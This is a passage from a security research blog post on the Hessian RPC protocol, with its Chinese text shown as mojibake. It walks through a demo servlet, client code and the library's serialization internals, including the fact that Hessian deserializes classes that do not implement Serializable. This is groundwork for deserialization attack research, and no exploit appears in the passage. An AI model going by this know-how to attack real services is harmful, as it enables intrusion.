<p>å®˜ç½‘é“¾æ¥ï¼š<a target="_blank" rel="noopener" href="http://hessian.caucho.com/">http://hessian.caucho.com/</a></p>
<h3 id="3-2-åºåˆ—åŒ–ååºåˆ—åŒ–è¿‡ç¨‹"><a href="#3-2-åºåˆ—åŒ–ååºåˆ—åŒ–è¿‡ç¨‹" class="headerlink" title="3.2 åºåˆ—åŒ–ååºåˆ—åŒ–è¿‡ç¨‹"></a>3.2 åºåˆ—åŒ–ååºåˆ—åŒ–è¿‡ç¨‹</h3><p>æˆ‘ä»¬æ¨¡æ‹Ÿä¸€æ¬¡å®¢æˆ·ç«¯ä½¿ç”¨Hessianåè®®ä¸æœåŠ¡ç«¯çš„ä¸€æ¬¡äº¤äº’è¿‡ç¨‹æ¥åˆ†æä¸‹è¯¥åè®®æ˜¯å¦‚ä½•å¤„ç†æ•°æ®çš„ã€‚Hessiançš„ä½¿ç”¨ä¸€èˆ¬æœ‰ä¸¤ç§å½¢å¼ï¼š1ã€åŸºäºWeb Servletï¼›2ã€ä¸Springç»“åˆä½¿ç”¨ã€‚æœ¬æ¬¡æ¼”ç¤ºæˆ‘ä»¬åŸºäºWeb Servletçš„å½¢å¼æ¥åˆ†æ</p>
<p>æ€»ä½“æ¥è¯´åˆ©ç”¨Hessianåè®®è¿›è¡Œä¸€æ¬¡è¿œç¨‹æ–¹æ³•è°ƒç”¨ï¼šå®¢æˆ·ç«¯-&gt;åºåˆ—åŒ–æ•°æ®å‘é€åˆ°æœåŠ¡ç«¯-&gt;æœåŠ¡ç«¯ååºåˆ—åŒ–æ•°æ®å¹¶è°ƒç”¨æ–¹æ³•-&gt;æœåŠ¡ç«¯å°†æ–¹æ³•æ‰§è¡Œç»“æœè¿›è¡Œåºåˆ—åŒ–å¹¶è¿”å›ç»™å®¢æˆ·ç«¯-&gt;å®¢æˆ·ç«¯ååºåˆ—åŒ–æ•°æ®æ‹¿åˆ°æ–¹æ³•çš„æ‰§è¡Œç»“æœ</p>
<p>ä¸å…¶ä»–RPCåè®®å¦‚RMIè°ƒç”¨ç±»ä¼¼ï¼Œä¹Ÿæ˜¯åŸºäºåºåˆ—åŒ–æ•°æ®è¿›è¡Œä¼ è¾“ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ·±å…¥ä»£ç çœ‹çœ‹Hessianæ˜¯å¦‚ä½•å¤„ç†çš„ï¼Œå­˜åœ¨å“ªäº›å®‰å…¨é£é™©~</p>
<h4 id="3-2-1-åŸºäºWeb-Servletå½¢å¼"><a href="#3-2-1-åŸºäºWeb-Servletå½¢å¼" class="headerlink" title="3.2.1 åŸºäºWeb Servletå½¢å¼"></a>3.2.1 åŸºäºWeb Servletå½¢å¼</h4><p>æœåŠ¡ç«¯å¼•å…¥com.caucho-hessian-4.0.63.jarï¼Œservletå¯ä»¥ä¸ºHessianServletã€ä¹Ÿå¯ä»¥æ˜¯ç»§æ‰¿è‡ªHessianServletçš„è‡ªå®ç°ç±»ï¼Œæˆ‘è¿™é‡Œæ¼”ç¤ºåœ¨web.xmlä¸­å°†HessianServletä½œä¸ºè·¯ç”±&#x2F;hessiançš„å¤„ç†handlerï¼Œå¹¶å°†å…¶æš´éœ²ç»™å®¢æˆ·ç«¯è¿›è¡Œè°ƒç”¨ï¼Œåˆå§‹åŒ–å‚æ•°é…ç½®å®¢æˆ·ç«¯å¯è°ƒç”¨çš„ç›®æ ‡ç±»BasicService</p>
<p>1ã€web.xml</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>hessianServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>    	<span class="hljs-tag">&lt;<span class="hljs-name">servlet-class</span>&gt;</span>com.caucho.hessian.server.HessianServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-class</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">init-param</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">param-name</span>&gt;</span>service-class<span class="hljs-tag">&lt;/<span class="hljs-name">param-name</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">param-value</span>&gt;</span>com.example.hessianserver.BasicService<span class="hljs-tag">&lt;/<span class="hljs-name">param-value</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">init-param</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>hessianServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/hessian<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>2ã€æ¥å£åŠå®ç°ç±»</p>
<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-title class_">BasicAPI</span>æ¥å£<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">BasicAPI</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">setGreeting</span>(<span class="hljs-title class_">String</span> greeting);<br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">hello</span>();<br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">User</span> <span class="hljs-title function_">getUser</span>();<br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">getObject</span>(<span class="hljs-title class_">Object</span> obj);<br>&#125;<br><br><span class="hljs-title class_">BasicService</span>å®ç°ç±»<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BasicService</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">BasicAPI</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-title class_">String</span> _greeting = <span class="hljs-string">&quot;Hello, world&quot;</span>;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">setGreeting</span>(<span class="hljs-params"><span class="hljs-built_in">String</span> greeting</span>) &#123;<br>        _greeting = greeting;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">hello</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">return</span> _greeting;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">User</span> <span class="hljs-title function_">getUser</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">&quot;pwnull&quot;</span>, <span class="hljs-string">&quot;pwnull&quot;</span>);<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">getObject</span>(<span class="hljs-params"><span class="hljs-built_in">Object</span> obj</span>) &#123;<br>        <span class="hljs-keyword">return</span> obj.<span class="hljs-title function_">toString</span>();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<p> 3ã€User pojoç±»ï¼š</p>
<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-keyword">import</span> java.io.Serializable;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> implements Serializable &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> serialVersionUID = <span class="hljs-number">153519254199840035L</span>;<br>    <span class="hljs-type">String</span> userName = <span class="hljs-string">&quot;pwnull&quot;</span>;<br>    <span class="hljs-type">String</span> password = <span class="hljs-string">&quot;pwnull&quot;</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">User</span><span class="hljs-params">(<span class="hljs-type">String</span> user, <span class="hljs-type">String</span> pwd)</span></span>&#123;<br>        <span class="hljs-keyword">this</span>.userName = user;<br>        <span class="hljs-keyword">this</span>.password = pwd;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">String</span> <span class="hljs-title">getUserName</span><span class="hljs-params">()</span></span>&#123;<br>        <span class="hljs-keyword">return</span> userName;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">String</span> <span class="hljs-title">getPassword</span><span class="hljs-params">()</span></span>&#123;<br>        <span class="hljs-keyword">return</span> password;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<p>å®¢æˆ·ç«¯è°ƒç”¨ï¼š</p>
<p>åŒæ ·å¼•å…¥com.caucho-hessian-4.0.63.jarï¼Œå†åˆ›å»ºä¸æœåŠ¡ç«¯ä¸€æ ·çš„BasicServiceæ¥å£åŠUser pojoç±»ï¼Œå®¢æˆ·ç«¯é€šè¿‡HessianProxyFactoryå·¥å‚ç±»åˆ›å»ºä»£ç†å¯¹è±¡å¹¶è¿›è¡Œæ–¹æ³•è°ƒç”¨</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><span class="hljs-keyword">import</span> java.net.MalformedURLException;<br><span class="hljs-keyword">import</span> com.caucho.hessian.client.HessianProxyFactory;<br><span class="hljs-keyword">import</span> com.example.hessianserver.BasicAPI;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">hessianClient</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> MalformedURLException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span><span class="hljs-string">&quot;http://127.0.0.1:8080/hessian&quot;</span>;<br>        <span class="hljs-type">SnmpAcl</span> <span class="hljs-variable">snmpAcl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SnmpAcl</span>(<span class="hljs-string">&quot;1&quot;</span>);<br>        <span class="hljs-type">HessianProxyFactory</span> <span class="hljs-variable">factory</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HessianProxyFactory</span>();<br>        <span class="hljs-comment">//factory.setHessian2Request(true);</span><br>        <span class="hljs-comment">//factory.setHessian2Reply(true);</span><br>        <span class="hljs-type">BasicAPI</span> <span class="hljs-variable">basic</span> <span class="hljs-operator">=</span> (BasicAPI) factory.create(BasicAPI.class, url);<br>        System.out.println(<span class="hljs-string">&quot;Hello:&quot;</span> + basic.hello());<br>        System.out.println(<span class="hljs-string">&quot;Hello:&quot;</span> + basic.getUser().getUserName());<br>        System.out.println(<span class="hljs-string">&quot;Hello:&quot;</span> + basic.getUser().getPassword());<br>        <span class="hljs-comment">//System.out.println(basic.getObject(snmpAcl));</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/11.png" srcset="/img/loading.gif" lazyload></p>
<p>å¦‚ä¸‹åˆ†ææ˜¯åŸºäºæœ€æ–°ç‰ˆ4.0.63ï¼Œç”±äºä¹‹å‰é‡ç‚¹åˆ†æè¿‡rmiåè®®ï¼Œå†æ¬¡çœ‹hessian RPCåè®®æ—¶æ„Ÿè§‰éå¸¸é¡ºç•…ã€‚æ•´ä½“æµç¨‹ä¸RMIç±»ä¼¼ï¼Œä½†æ˜¯å¯¹äºè‡ªå®šä¹‰ç±»çš„å¤„ç†ä¸RMIä¸åŒï¼Œå› æ­¤ç›¸å¯¹åº”çš„æ¼æ´åˆ©ç”¨æ–¹å¼ä¹Ÿæœ‰äº›åŒºåˆ«ã€‚ç»§ç»­çœ‹</p>
<figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dart"><span class="hljs-built_in">String</span> url =<span class="hljs-string">&quot;http://127.0.0.1:8080/hessian&quot;</span>;<br>HessianProxyFactory <span class="hljs-keyword">factory</span> = <span class="hljs-keyword">new</span> HessianProxyFactory();<br>BasicAPI basic = (BasicAPI) <span class="hljs-keyword">factory</span>.create(BasicAPI.<span class="hljs-keyword">class</span>, url);<br>basic.hello();<br></code></pre></td></tr></table></figure>

<p>åœ¨å®¢æˆ·ç«¯è°ƒç”¨è¿œç«¯çš„helloæ–¹æ³•æ—¶ï¼Œå¤„ç†é€»è¾‘åœ¨com.caucho.hessian.client.HessianProxy#invokeä¸­ï¼š1ã€åˆ¤æ–­è°ƒç”¨æ–¹æ³•æ˜¯å¦æ˜¯å†…ç½®æ–¹æ³•ï¼Œå¦‚æœæ˜¯é‚£ä¹ˆä¼šåœ¨æœ¬åœ°æ‰§è¡Œå¹¶è¿”å›ç»“æœï¼›2ã€å¦‚æœæ˜¯è¿œç«¯æ–¹æ³•ï¼Œä¼šè°ƒç”¨HessianProxy#sendRequestè¿›è¡Œæ•°æ®ç»„è£…å¹¶å‘é€ï¼›3ã€å®¢æˆ·ç«¯ç­‰å¾…æœåŠ¡ç«¯è¿”å›æ–¹æ³•çš„æ‰§è¡Œç»“æœï¼ŒHessianä¼ è¾“çš„æ˜¯åºåˆ—åŒ–æ•°æ®ï¼Œæ‰€ä»¥åœ¨æ‹¿åˆ°ç»“æœåéœ€è¦è¿›è¡Œååºåˆ—åŒ–è¯»å–</p>
<p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/12.png" srcset="/img/loading.gif" lazyload></p>
<p>åœ¨HessianProxy#sendRequestä¸­æ·»åŠ Hessiançš„headerè¯·æ±‚å¤´ã€åœ¨HessianOutput#callä¸­ç»„è£…æ•°æ®ã€åºåˆ—åŒ–å†™å…¥å‚æ•°å¯¹è±¡</p>
<p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/13.png" srcset="/img/loading.gif" lazyload></p>
<p>å®¢æˆ·ç«¯è°ƒç”¨Hessian2Input#readReply ååºåˆ—åŒ–è¯»å–æœåŠ¡ç«¯çš„è¿”å›æ•°æ®</p>
<p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/14.png" srcset="/img/loading.gif" lazyload></p>
<p>æœåŠ¡ç«¯åœ¨HessianServlet#serviceæ–¹æ³•ä¸­å¤„ç†å®¢æˆ·ç«¯çš„è°ƒç”¨è¯·æ±‚</p>
<p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/15.png" srcset="/img/loading.gif" lazyload></p>
<p>åœ¨HessianSkeleton#invokeä¸­è¯»å–æ•°æ®çš„headerå­—æ®µï¼Œè¿™é‡Œé»˜è®¤æ˜¯CALL_1_REPLY_2ï¼Œè¡¨ç¤ºä½¿ç”¨ç‰ˆæœ¬åè®®1è°ƒç”¨ï¼Œä½¿ç”¨ç‰ˆæœ¬åè®®2è¿”å›ï¼Œå¹¶åˆ›å»ºäº†å¯¹åº”ç‰ˆæœ¬çš„HessianInputï¼ˆç‰ˆæœ¬1ï¼‰è¾“å…¥æµã€Hessian2Outputï¼ˆç‰ˆæœ¬2ï¼‰è¾“å‡ºæµ</p>
<p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/16.png" srcset="/img/loading.gif" lazyload></p>
<p>åœ¨HessianSkeleton#invokeæ–¹æ³•ä¸­ï¼š1ã€è·å–ç›®æ ‡æ–¹æ³•ï¼›2ã€è·å–æ–¹æ³•å¯¹åº”å‚æ•°ï¼›3ã€åå°„è°ƒç”¨ï¼›4ã€å°†æ–¹æ³•çš„æ‰§è¡Œç»“æœé€šè¿‡AbstractHessianOutput#writeReplyæ–¹æ³•å†™å…¥æµä¸­å¹¶ä¼ å›ç»™å®¢æˆ·ç«¯</p>
<p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/17.png" srcset="/img/loading.gif" lazyload></p>
<p>æœåŠ¡ç«¯åœ¨å¤„ç†è¿‡ç¨‹ä¸­ç”¨åˆ°çš„å‡ ä¸ªé‡ç‚¹ç±»åŠæ–¹æ³•</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">com<span class="hljs-selector-class">.caucho</span><span class="hljs-selector-class">.services</span><span class="hljs-selector-class">.server</span>.AbstractSkeleton<span class="hljs-selector-id">#AbstractSkeleton</span><br>	åˆå§‹åŒ–æ—¶æ¥æ”¶è°ƒç”¨æ¥å£ç±»å‹ï¼Œå¹¶å°†æ¥å£æ–¹æ³•æ·»åŠ åˆ°å±æ€§_methodMapä¸­ï¼Œå…¶æ ¼å¼ä¸ºï¼šæ–¹æ³•å__å‚æ•°é•¿åº¦ã€æ–¹æ³•å_å‚æ•°<span class="hljs-number">1</span>ç±»å‹_å‚æ•°<span class="hljs-number">2</span>ç±»å‹<br><br>com<span class="hljs-selector-class">.caucho</span><span class="hljs-selector-class">.hessian</span><span class="hljs-selector-class">.server</span><span class="hljs-selector-class">.HessianSkeleton</span><br>	ç»§æ‰¿è‡ªAbstractSkeletonï¼Œåˆå§‹åŒ–æ—¶æ¥æ”¶æ¥å£ä¸å®ç°ç±»ï¼Œå¹¶å°†å®ç°ç±»èµ‹å€¼ç»™å±æ€§service<br></code></pre></td></tr></table></figure>

<p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/18.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/19.png" srcset="/img/loading.gif" lazyload></p>
<p>å¦‚ä¸Šæ˜¯ä¸€æ¬¡å®Œæ•´çš„å®¢æˆ·ç«¯ä¸æœåŠ¡ç«¯çš„è°ƒç”¨äº¤äº’è¿‡ç¨‹ï¼Œåœ¨è°ƒç”¨åºåˆ—åŒ–writeObject&#x2F;ååºåˆ—åŒ–readObjectæ–¹æ³•æ—¶ï¼Œéƒ½ä¼šæ ¹æ®ç›®æ ‡ç±»å‹é€‰æ‹©ä¸åŒçš„åºåˆ—åŒ–&#x2F;ååºåˆ—åŒ–å™¨ã€‚æˆ‘ä»¬æ•´ä½“æ¥çœ‹ä¸‹</p>
<h4 id="3-2-2-åºåˆ—åŒ–-x2F-ååºåˆ—åŒ–å™¨"><a href="#3-2-2-åºåˆ—åŒ–-x2F-ååºåˆ—åŒ–å™¨" class="headerlink" title="3.2.2 åºåˆ—åŒ–&#x2F;ååºåˆ—åŒ–å™¨"></a>3.2.2 åºåˆ—åŒ–&#x2F;ååºåˆ—åŒ–å™¨</h4><p>æ ¹æ®<code>SerializerFactory#getDefaultSerializerè·Ÿ</code>æ¥åˆ†æï¼Œé»˜è®¤çš„åºåˆ—åŒ–&#x2F;ååºåˆ—åŒ–å™¨æ˜¯ UnsafeSerializer&#x2F;UnsafeDeserializerï¼Œå½“å®¢æˆ·ç«¯åºåˆ—åŒ–è‡ªå®šä¹‰Objectå¯¹è±¡ï¼ˆä¾‹å­ä¸ºSnmpAclå¯¹è±¡ï¼‰æ—¶ï¼Œä¼šè°ƒç”¨UnsafeSerializer#writeObjectï¼Œè¿™ä¸ªæ–¹æ³•å…¼å®¹äº†Hessian1ä¸Hessian2çš„æ ¼å¼å†™æ³•ï¼šç»Ÿä¸€è°ƒç”¨AbstractHessianOutput#writeObjectBeginï¼ŒHessian1çš„HessianOutputæœªå®ç°æ­¤æ–¹æ³•ï¼Œæ‰€ä»¥ä¼šè°ƒç”¨åˆ°HessianOutput#writeMapBeginå†™å…¥Mapçš„æ ¼å¼æ•°æ®ï¼Œè€ŒHessian2å®ç°äº†æ­¤æ–¹æ³•ï¼Œæ‰€ä»¥ä¼šè°ƒç”¨åˆ°Hessian2Output#writeObjectBeginï¼Œä¸å†™å…¥Mapçš„æ ¼å¼æ•°æ®</p>
<p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/20.png" srcset="/img/loading.gif" lazyload></p>
<p>com.caucho.hessian.io.AbstractHessianOutput#writeObjectBegin</p>
<p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/21.png" srcset="/img/loading.gif" lazyload></p>
<p>Hessian1è‡ªå®šä¹‰ç±»å‹çš„åºåˆ—åŒ–åˆå§‹æ–¹æ³•ï¼šcom.caucho.hessian.io.HessianOutput#writeMapBegin</p>
<p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/22.png" srcset="/img/loading.gif" lazyload></p>
<p>Hessian2è‡ªå®šä¹‰ç±»å‹çš„åºåˆ—åŒ–åˆå§‹æ–¹æ³•ï¼šcom.caucho.hessian.io.Hessian2Output#writeObjectBegin</p>
<p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/23.png" srcset="/img/loading.gif" lazyload></p>
<p>å½“ä½¿ç”¨Hessian1åè®®ä¼ è¾“è‡ªå®šä¹‰æ•°æ®ç±»å‹æ—¶ï¼ŒæœåŠ¡ç«¯æ€»ä¼šä½¿ç”¨UnsafeDeserializer#readMapè¿›è¡Œå¤„ç†ï¼š1ã€ä½¿ç”¨_unsafe.allocateInstanceåˆ›å»ºç›®æ ‡ç±»å®ä¾‹ï¼›2ã€è°ƒç”¨ç›®æ ‡ç±»å±æ€§å¯¹åº”ç±»å‹çš„ååºåˆ—åŒ–å™¨ï¼ŒreadXXXæ–¹æ³•è¯»å–å±æ€§å€¼å¹¶è°ƒç”¨Unsafe#putObjectå†™å…¥</p>
<p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/24.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/25.png" srcset="/img/loading.gif" lazyload></p>
<p>å½“ä½¿ç”¨Hessian2åè®®ä¼ è¾“è‡ªå®šä¹‰æ•°æ®ç±»å‹æ—¶ï¼ŒæœåŠ¡ç«¯ä¼šä½¿ç”¨UnsafeDeserializer#readObjectè¿›è¡Œå¤„ç†ï¼š1ã€ä½¿ç”¨_unsafe.allocateInstanceåˆ›å»ºç›®æ ‡ç±»å®ä¾‹ï¼›2ã€è°ƒç”¨ç›®æ ‡ç±»å±æ€§å¯¹åº”ç±»å‹çš„ååºåˆ—åŒ–å™¨ï¼ŒreadXXXæ–¹æ³•è¯»å–å±æ€§å€¼å¹¶è°ƒç”¨Unsafe#putObjectå†™å…¥</p>
<p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/26.png" srcset="/img/loading.gif" lazyload></p>
<p>æ‰€ä»¥åœ¨Hessian1ä¸­ï¼Œè‡ªå®šä¹‰æ•°æ®ç±»å‹éƒ½æ˜¯åŒ…è£…ä¸ºMapç±»å‹è¿›è¡Œåºåˆ—åŒ–&#x2F;ååºåˆ—åŒ–æ“ä½œçš„ï¼ŒHessian1æ²¡æœ‰å¯¹Objectè¿›è¡Œå•ç‹¬å¤„ç†ã€‚åˆ°äº†Hessian2ä¸­ï¼Œæ‰å¯¹è‡ªå®šä¹‰æ•°æ®ç±»å‹ï¼ˆObjectï¼‰è¿›è¡Œäº†å•ç‹¬å¤„ç†ã€‚è¿™ä¸ªç‰¹æ€§éœ€è¦æ³¨æ„ä¸‹ã€‚</p>
<p>å¦å¤–è¦æ³¨æ„å®¢æˆ·ç«¯é»˜è®¤ä¸ºHessian1æ ¼å¼è¯·æ±‚ã€ä»¥Hessian2æ ¼å¼å“åº”ï¼Œå³ä¸Šé¢æåˆ°çš„headerå­—æ®µ<code>CALL_1_REPLY_2</code>ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥ä½¿ç”¨setHessian2Request&#x2F;setHessian2Replyæ–¹æ³•æ˜¾å¼æŒ‡å®šè¯·æ±‚åŠå“åº”çš„åè®®ç‰ˆæœ¬</p>
<figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dart">HessianProxyFactory <span class="hljs-keyword">factory</span> = <span class="hljs-keyword">new</span> HessianProxyFactory();<br><span class="hljs-keyword">factory</span>.setHessian2Request(<span class="hljs-keyword">true</span>);<br><span class="hljs-keyword">factory</span>.setHessian2Reply(<span class="hljs-keyword">true</span>);<br></code></pre></td></tr></table></figure>

<p>com.caucho.hessian.client.HessianProxyFactory#getHessianOutput </p>
<p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/27.png" srcset="/img/loading.gif" lazyload></p>
<h4 id="3-2-3-Serializableæ¥å£é—®é¢˜"><a href="#3-2-3-Serializableæ¥å£é—®é¢˜" class="headerlink" title="3.2.3 Serializableæ¥å£é—®é¢˜"></a>3.2.3 Serializableæ¥å£é—®é¢˜</h4><p>å®¢æˆ·ç«¯è°ƒç”¨è¿œç¨‹æ–¹æ³•æ—¶ï¼Œè·å–é»˜è®¤åºåˆ—åŒ–å™¨UnsafeSerializeræ—¶ä¼šåˆ¤æ–­ç±»æ˜¯å¦å®ç°Serializableæ¥å£ï¼Œæˆ–è€…<strong>åˆ¤æ–­æ˜¯å¦è®¾ç½®äº†å˜é‡isAllowNonSerializable</strong>ï¼Œå¦‚æœisAllowNonSerializableè®¾ç½®ä¸ºtrueï¼Œåˆ™å…è®¸åºåˆ—åŒ–æœªå®ç°Serializableæ¥å£çš„ç±»ï¼Œå¹¶ä¸”æœåŠ¡ç«¯ä¸ä¼šæ£€æµ‹ç±»æ˜¯å¦å®ç°äº†Serializableæ¥å£ã€‚<strong>è¿™ä¸ªæ˜¯ä¸JavaåŸç”Ÿååºåˆ—åŒ–ä¸åŒçš„ä¸€ä¸ªç‚¹ï¼šHessianå¯ä»¥å¯¹æœªå®ç°Serializableæ¥å£çš„ç±»å¯¹è±¡è¿›è¡Œåºåˆ—åŒ–&#x2F;ååºåˆ—åŒ–æ“ä½œ</strong></p>
<p>com.caucho.hessian.io.SerializerFactory#getDefaultSerializer</p>
<p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/28.png" srcset="/img/loading.gif" lazyload></p>
